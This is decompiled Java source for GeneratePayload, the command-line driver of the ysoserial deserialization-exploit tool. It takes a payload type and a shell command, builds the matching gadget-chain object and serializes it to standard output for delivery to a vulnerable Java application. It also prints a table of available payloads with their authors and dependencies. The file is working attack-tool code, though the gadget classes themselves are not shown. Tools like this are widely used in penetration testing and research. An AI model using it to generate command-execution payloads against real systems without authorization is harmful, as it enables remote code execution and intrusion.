package ysoserial;

import java.io.PrintStream;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.Collections;
import java.util.LinkedList;
import java.util.List;
import net.sf.json.util.JSONUtils;
import ysoserial.Strings;
import ysoserial.payloads.ObjectPayload;
import ysoserial.payloads.annotation.Authors;
import ysoserial.payloads.annotation.Dependencies;

/* loaded from: ysoserial-all.jar:ysoserial/GeneratePayload.class */
public class GeneratePayload {
    private static final int INTERNAL_ERROR_CODE = 70;
    private static final int USAGE_CODE = 64;

    public static void main(String[] args) {
        if (args.length != 2) {
            printUsage();
            System.exit(64);
        }
        String payloadType = args[0];
        String command = args[1];
        Class<? extends ObjectPayload> payloadClass = ObjectPayload.Utils.getPayloadClass(payloadType);
        if (payloadClass == null) {
            System.err.println("Invalid payload type '" + payloadType + JSONUtils.SINGLE_QUOTE);
            printUsage();
            System.exit(64);
            return;
        }
        try {
            ObjectPayload payload = payloadClass.newInstance();
            Object object = payload.getObject(command);
            PrintStream out = System.out;
            Serializer.serialize(object, out);
            ObjectPayload.Utils.releasePayload(payload, object);
        } catch (Throwable e) {
            System.err.println("Error while generating or serializing payload");
            e.printStackTrace();
            System.exit(70);
        }
        System.exit(0);
    }

    private static void printUsage() {
        System.err.println("Y SO SERIAL?");
        System.err.println("Usage: java -jar ysoserial-[version]-all.jar [payload] '[command]'");
        System.err.println("  Available payload types:");
        List<Class<? extends ObjectPayload>> payloadClasses = new ArrayList<>(ObjectPayload.Utils.getPayloadClasses());
        Collections.sort(payloadClasses, new Strings.ToStringComparator());
        List<String[]> rows = new LinkedList<>();
        rows.add(new String[]{"Payload", "Authors", "Dependencies"});
        rows.add(new String[]{"-------", "-------", "------------"});
        for (Class<? extends ObjectPayload> payloadClass : payloadClasses) {
            rows.add(new String[]{payloadClass.getSimpleName(), Strings.join(Arrays.asList(Authors.Utils.getAuthors(payloadClass)), ", ", "@", ""), Strings.join(Arrays.asList(Dependencies.Utils.getDependenciesSimple(payloadClass)), ", ", "", "")});
        }
        List<String> lines = Strings.formatTable(rows);
        for (String line : lines) {
            System.err.println("     " + line);
        }
    }
}